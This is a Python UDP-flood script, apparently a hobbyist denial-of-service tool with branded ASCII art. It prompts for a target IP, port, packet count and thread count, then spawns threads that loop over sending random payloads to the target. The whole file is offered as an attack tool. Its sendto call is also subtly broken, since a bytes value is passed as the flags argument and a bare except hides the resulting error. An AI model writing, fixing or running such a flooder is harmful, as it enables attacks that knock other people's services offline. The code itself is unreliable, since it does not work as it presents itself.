import random
import socket
import threading
import os
import time

os.system("clear")
print('''\033[91mCREDIT BY : RΣTZ.''')
time.sleep(2)
print('''
\033[93m ██▀███  ▓█████▄▄▄█████▓▒███████▒
▓██ ▒ ██▒▓█   ▀▓  ██▒ ▓▒▒ ▒ ▒ ▄▀░
▓██ ░▄█ ▒▒███  ▒ ▓██░ ▒░░ ▒ ▄▀▒░ 
▒██▀▀█▄  ▒▓█  ▄░ ▓██▓ ░   ▄▀▒   ░
░██▓ ▒██▒░▒████▒ ▒██▒ ░ ▒███████▒
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒ ░░   ░▒▒ ▓░▒░▒
  ░▒ ░ ▒░ ░ ░  ░   ░    ░░▒ ▒ ░ ▒
  ░░   ░    ░    ░      ░ ░ ░ ░ ░
   ░        ░  ░          ░ ░    ''')
print("")
ip = str(input("\033[92mIp Target \033[94m===> "))
port = int(input("\033[92mPort Target \033[94m===> "))
times = int(input("\033[92mSend Packets \033[94m===> "))
threads = int(input("\033[92mSend Threads \033[94m===> "))
os.system("clear")
time.sleep(1)

def ppx():
  data = random._urandom(600)
  datab = random._urandom(811)
  while True:
  	try:
  		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  		apa = (str(ip),int(port))
  		sock.connect((ip,port))
  		sock.sendto(data,datab,apa)
  		for x in range(times):
  			sock.sendto(data,datab,apa)
  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
  	except:
  		print("\033[1;36;40mATTACK BY \033[1;31;40mRΣX RIOT!!")
              
for y in range(threads):
  rex = threading.Thread(target = ppx)
  rex.start()
